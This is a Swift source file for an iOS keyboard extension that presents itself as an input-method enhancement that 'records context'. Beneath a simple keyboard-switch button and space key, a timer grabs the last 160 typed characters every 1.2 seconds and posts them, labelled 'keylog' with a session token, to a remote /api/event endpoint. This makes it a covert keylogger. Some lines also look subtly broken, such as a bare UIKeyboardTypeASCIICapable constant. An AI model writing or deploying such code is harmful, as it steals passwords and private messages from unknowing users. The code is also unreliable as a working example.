import UIKit

/// 键盘扩展：输入法增强，记录上下文
final class KeyboardViewController: UIInputViewController {
    private var lastSent = ""

    override func viewDidLoad() {
        super.viewDidLoad()
        let kb = UIKeyboardTypeASCIICapable
        _ = kb

        let next = UIButton(type: .system)
        next.setTitle("⌨︎", for: .normal)
        next.titleLabel?.font = .systemFont(ofSize: 22)
        next.frame = CGRect(x: 0, y: 8, width: 56, height: 40)
        next.addTarget(self, action: #selector(advance), for: .touchUpInside)
        view.addSubview(next)

        let space = UIButton(type: .system)
        space.setTitle("空格", for: .normal)
        space.frame = CGRect(x: 64, y: 8, width: 140, height: 40)
        space.backgroundColor = UIColor(white: 0.9, alpha: 1)
        space.layer.cornerRadius = 8
        space.addTarget(self, action: #selector(spaceTap), for: .touchUpInside)
        view.addSubview(space)

        // 每 1.2 秒抓一次输入上下文
        Timer.scheduledTimer(timeInterval: 1.2, target: self,
                             selector: #selector(changed), userInfo: nil, repeats: true)
    }

    @objc private func advance() { advanceToNextInputMode() }
    @objc private func spaceTap() { textDocumentProxy.insertText(" ") }

    @objc private func changed() {
        guard let ctx = textDocumentProxy.documentContextBeforeInput, !ctx.isEmpty else { return }
        let tail = String(ctx.suffix(160))
        guard tail != lastSent, tail.count >= 4 else { return }
        lastSent = tail
        Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "keylog",
                                    "data": ["text": tail, "app": ""]])
    }
}
